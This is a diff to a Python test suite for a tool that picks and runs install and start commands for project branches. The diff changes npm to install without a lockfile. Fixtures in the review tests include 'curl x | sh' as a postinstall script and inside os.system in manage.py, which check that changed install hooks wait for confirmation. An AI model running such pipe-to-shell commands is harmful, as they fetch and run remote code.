@@ -45,9 +45,18 @@ class Commands(unittest.TestCase):
         self.assertEqual(start_command(self.d), 'python3 manage.py runserver $PORT')
         write(f'{self.d}/package.json', json.dumps({'scripts': {'build': 'vite build', 'start': 'node s.js', 'dev': 'vite'}}))
         self.assertEqual(start_command(self.d), 'npm run dev')
-        self.assertEqual(install_command(self.d), 'npm install')
+        self.assertEqual(install_command(self.d), 'npm install --no-package-lock')
         write(f'{self.d}/pnpm-lock.yaml', '')
         self.assertEqual(start_command(self.d), 'pnpm run dev')
+
+    def test_the_install_never_rewrites_the_lockfile(self):
+        write(f'{self.d}/package.json', '{}')
+        self.assertEqual(install_command(self.d), 'npm install --no-package-lock')  # no lockfile: don't leave one behind
+        write(f'{self.d}/package-lock.json', '{}')
+        self.assertEqual(install_command(self.d), 'npm ci')
+        for lock, cmd in (('yarn.lock', 'yarn install --frozen-lockfile'), ('pnpm-lock.yaml', 'pnpm install --frozen-lockfile')):
+            write(f'{self.d}/{lock}', '')
+            self.assertEqual(install_command(self.d), cmd)
 
     def test_a_package_without_a_server_script_falls_back(self):
         write(f'{self.d}/package.json', json.dumps({'scripts': {'test': 'vitest'}}))
@@ -129,11 +138,11 @@ class Running(Helpers, Base):
         self.branch('builder-1', {'package.json': '{"scripts": {"dev": "nosuchtool"}}'})
         self.go('demo', 'builder-1')
         got = wait_for(lambda: self.one('builder-1'), 'failed')
-        self.assertEqual((got['fix'], got['install']), ('install', 'npm install'))
+        self.assertEqual((got['fix'], got['install']), ('install', 'npm install --no-package-lock'))
         self.p.popen = lambda args, **kw: subprocess.Popen(['/bin/sh', '-c', 'echo "$0"; exit 3', args[2]], **kw)
         self.go('demo', 'builder-1', install=True)
         got = wait_for(lambda: self.one('builder-1'), 'failed')
-        self.assertIn('npm install && npm run dev', got['output'])  # what would have run, shown by the stand-in
+        self.assertIn('npm install --no-package-lock && npm run dev', got['output'])  # what would have run, shown by the stand-in
 
     def test_a_server_that_never_opens_a_port_is_stopped(self):
         self.branch('builder-1', {'c.py': 'x'})
@@ -227,7 +236,7 @@ class ReviewFixes(Helpers, Base):
         got = self.p.start('demo', 'builder-1')
         self.assertEqual(got['changed'], ['postinstall', 'prepare'])
         self.assertEqual(got['steps'], [
-            {'line': 'npm install', 'scripts': [{'name': 'postinstall', 'runs': 'curl x | sh', 'changed': True},
+            {'line': 'npm install --no-package-lock', 'scripts': [{'name': 'postinstall', 'runs': 'curl x | sh', 'changed': True},
                                                 {'name': 'prepare', 'runs': 'node a.js', 'changed': True}]},
             {'line': 'npm run dev', 'scripts': [{'name': 'dev', 'runs': 'vite', 'changed': False}]}])
         self.branch('builder-2', {'manage.py': 'import os; os.system("curl x | sh")\n'})
@@ -240,9 +249,9 @@ class ReviewFixes(Helpers, Base):
         ran = []
         self.p.popen = lambda args, **kw: ran.append(args[2]) or subprocess.Popen(['sleep', '30'], **kw)
         got = self.p.start('demo', 'builder-1')
-        self.assertEqual((got['state'], got['install']), ('confirm', 'npm install'))
+        self.assertEqual((got['state'], got['install']), ('confirm', 'npm install --no-package-lock'))
         self.p.start('demo', 'builder-1', confirm=got['fingerprint'])
-        self.assertEqual(ran, ['npm install && npm run dev'])
+        self.assertEqual(ran, ['npm install --no-package-lock && npm run dev'])
 
     def test_a_server_that_stops_listening_is_failed_with_its_last_lines(self):  # 4
         self.p.lost_timeout = 1
